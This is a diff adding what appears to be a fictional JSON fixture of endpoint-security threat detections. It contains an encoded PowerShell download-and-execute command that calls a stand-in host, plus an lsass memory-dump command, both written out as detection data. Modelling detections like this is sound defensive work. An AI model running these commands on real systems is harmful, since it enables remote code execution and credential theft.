@@ -1,0 +1,191 @@
+{
+  "data": [
+    {
+      "id": "1000000000000000101",
+      "agentDetectionInfo": {
+        "accountId": "1000000000000000001",
+        "accountName": "Example Corp (fictional)",
+        "siteId": "1000000000000000002",
+        "siteName": "Lab (fictional)",
+        "groupId": "1000000000000000003",
+        "groupName": "Workstations (fictional)",
+        "agentUuid": "00000000-0000-4000-8000-000000000501",
+        "agentVersion": "0.0.0-sample",
+        "agentOsName": "Windows 11 Pro",
+        "agentIpV4": "192.0.2.44",
+        "externalIp": "198.51.100.20",
+        "agentMitigationMode": "protect"
+      },
+      "agentRealtimeInfo": {
+        "agentComputerName": "WS-FIN-0144",
+        "agentId": "1000000000000000201",
+        "agentOsName": "Windows 11 Pro",
+        "agentDomain": "LAB",
+        "agentNetworkStatus": "connected"
+      },
+      "threatInfo": {
+        "threatId": "1000000000000000101",
+        "createdAt": "2026-10-14T09:17:33.000000Z",
+        "mitigationStatus": "mitigated",
+        "incidentStatus": "unresolved",
+        "analystVerdict": "undefined",
+        "threatName": "powershell.exe",
+        "classification": "Malware",
+        "confidenceLevel": "malicious",
+        "detectionType": "dynamic",
+        "detectionEngines": [
+          {
+            "key": "executables",
+            "title": "Behavioral AI"
+          }
+        ],
+        "filePath": "\\Device\\HarddiskVolume3\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "sha256": "7d5d448f94a3fade18efbd90ac3ac5d0041fbac2806b4cf2c200c56af8efff77",
+        "originatorProcess": "WINWORD.EXE",
+        "processUser": "LAB\\d.okafor",
+        "maliciousProcessArguments": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBjAGQAbgAuAGkAbgB2AG8AaQBjAGUALQBwAG8AcgB0AGEAbAAuAGUAeABhAG0AcABsAGUALwBxADMALgBwAHMAMQAnACkA",
+        "storyline": "5A7C1E0F3B9D2468",
+        "isFileless": false
+      },
+      "indicators": [
+        {
+          "category": "Exploitation",
+          "description": "An Office application started PowerShell",
+          "ids": [
+            101
+          ]
+        },
+        {
+          "category": "Evasion",
+          "description": "PowerShell ran an encoded command",
+          "ids": [
+            102
+          ]
+        },
+        {
+          "category": "General",
+          "description": "Downloaded content from the network and ran it in memory",
+          "ids": [
+            103
+          ]
+        }
+      ]
+    },
+    {
+      "id": "1000000000000000102",
+      "agentDetectionInfo": {
+        "accountId": "1000000000000000001",
+        "accountName": "Example Corp (fictional)",
+        "siteId": "1000000000000000002",
+        "siteName": "Lab (fictional)",
+        "groupId": "1000000000000000003",
+        "groupName": "Workstations (fictional)",
+        "agentUuid": "00000000-0000-4000-8000-000000000502",
+        "agentVersion": "0.0.0-sample",
+        "agentOsName": "Windows 11 Pro",
+        "agentIpV4": "192.0.2.27",
+        "externalIp": "198.51.100.20",
+        "agentMitigationMode": "protect"
+      },
+      "agentRealtimeInfo": {
+        "agentComputerName": "WS-ENG-0207",
+        "agentId": "1000000000000000202",
+        "agentOsName": "Windows 11 Pro",
+        "agentDomain": "LAB",
+        "agentNetworkStatus": "connected"
+      },
+      "threatInfo": {
+        "threatId": "1000000000000000102",
+        "createdAt": "2026-10-14T09:24:33.000000Z",
+        "mitigationStatus": "mitigated",
+        "incidentStatus": "unresolved",
+        "analystVerdict": "undefined",
+        "threatName": "invoice_2026_10.pdf.exe",
+        "classification": "Trojan",
+        "confidenceLevel": "malicious",
+        "detectionType": "static",
+        "engines": [
+          "On-Write Static AI"
+        ],
+        "filePath": "\\Device\\HarddiskVolume3\\Users\\j.reyes\\Downloads\\invoice_2026_10.pdf.exe",
+        "sha256": "1fcd836d1502a2b41afbf60b7cea10b920a2ea9e1cbcdd1864fb849ded865dc2",
+        "originatorProcess": "explorer.exe",
+        "processUser": "LAB\\j.reyes",
+        "maliciousProcessArguments": "\"C:\\Users\\j.reyes\\Downloads\\invoice_2026_10.pdf.exe\"",
+        "storyline": "9E21B07D4C6F3A15",
+        "isFileless": false
+      },
+      "indicators": [
+        {
+          "category": "Evasion",
+          "description": "File name has a double extension (.pdf.exe)",
+          "ids": [
+            201
+          ]
+        }
+      ]
+    },
+    {
+      "id": "1000000000000000103",
+      "agentDetectionInfo": {
+        "accountId": "1000000000000000001",
+        "accountName": "Example Corp (fictional)",
+        "siteId": "1000000000000000002",
+        "siteName": "Lab (fictional)",
+        "groupId": "1000000000000000003",
+        "groupName": "Workstations (fictional)",
+        "agentUuid": "00000000-0000-4000-8000-000000000503",
+        "agentVersion": "0.0.0-sample",
+        "agentOsName": "Windows Server 2022",
+        "agentIpV4": "192.0.2.3",
+        "externalIp": "198.51.100.20",
+        "agentMitigationMode": "protect",
+        "agentComputerName": "SRV-LAB-0003"
+      },
+      "threatInfo": {
+        "threatId": "1000000000000000103",
+        "createdAt": "2026-10-14T09:31:33.000000Z",
+        "mitigationStatus": "mitigated",
+        "incidentStatus": "unresolved",
+        "analystVerdict": "undefined",
+        "threatName": "rundll32.exe",
+        "classification": "Generic.Heuristic",
+        "confidenceLevel": "suspicious",
+        "detectionType": "dynamic",
+        "detectionEngines": [
+          {
+            "key": "executables",
+            "title": "Behavioral AI"
+          }
+        ],
+        "filePath": "\\Device\\HarddiskVolume2\\Windows\\System32\\rundll32.exe",
+        "sha256": "01754d35582a5c211a9b404a90278def42e80b0b642629706490826319f3b22d",
+        "originatorProcess": "cmd.exe",
+        "processUser": "LAB\\svc_patch",
+        "maliciousProcessArguments": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 612 C:\\ProgramData\\lsass.dmp full",
+        "storyline": "C3D80A6B12E4F579",
+        "isFileless": false
+      },
+      "indicators": [
+        {
+          "category": "InfoStealer",
+          "description": "Read the memory of lsass.exe",
+          "ids": [
+            301
+          ]
+        },
+        {
+          "category": "Persistence",
+          "description": "Wrote a memory dump to ProgramData",
+          "ids": [
+            302
+          ]
+        }
+      ]
+    }
+  ],
+  "pagination": {
+    "nextCursor": null,
+    "totalItems": 3
+  }
+}
